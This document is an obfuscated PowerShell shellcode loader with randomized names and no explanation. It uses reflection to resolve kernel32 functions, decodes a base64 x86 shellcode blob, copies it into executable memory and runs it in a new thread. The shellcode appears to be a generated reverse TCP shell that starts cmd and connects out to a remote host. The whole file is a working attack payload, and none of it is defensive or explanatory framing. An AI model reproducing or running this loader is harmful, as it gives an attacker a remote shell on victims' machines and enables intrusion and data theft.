function rJM {
        Param ($nE1US, $oAt)
        $jL = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')

        return $jL.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($jL.GetMethod('GetModuleHandle')).Invoke($null, @($nE1US)))), $oAt))
}

function yt {
        Param (
                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $b9Y2,
                [Parameter(Position = 1)] [Type] $cRdVG = [Void]
        )

        $vtChq = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $vtChq.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $b9Y2).SetImplementationFlags('Runtime, Managed')
        $vtChq.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $cRdVG, $b9Y2).SetImplementationFlags('Runtime, Managed')

        return $vtChq.CreateType()
}

[Byte[]]$tgt1 = [System.Convert]::FromBase64String("/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfVGhMdyYH/9W4kAEAACnEVFBoKYBrAP/VUFBQUEBQQFBo6g/f4P/Vl2oFaNLXgW9oAgAiuInmahBWV2iZpXRh/9WFwHQM/04Idexo8LWiVv/VaGNtZACJ41dXVzH2ahJZVuL9ZsdEJDwBAY1EJBDGAERUUFZWVkZWTlZWU1Zoecw/hv/VieBOVkb/MGgIhx1g/9W78LWiVmimlb2d/9U8BnwKgPvgdQW7RxNyb2oAU//V")
[Uint32]$pi = 0
$f8 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((rJM kernel32.dll VirtualAlloc), (yt @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $tgt1.Length,0x3000, 0x04)

[System.Runtime.InteropServices.Marshal]::Copy($tgt1, 0, $f8, $tgt1.length)
if (([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((rJM kernel32.dll VirtualProtect), (yt @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool]))).Invoke($f8, [Uint32]$tgt1.Length, 0x10, [Ref]$pi)) -eq $true) {
        $htw3 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((rJM kernel32.dll CreateThread), (yt @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$f8,[IntPtr]::Zero,0,[IntPtr]::Zero)
        [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((rJM kernel32.dll WaitForSingleObject), (yt @([IntPtr], [Int32]))).Invoke($htw3,0xffffffff) | Out-Null
}
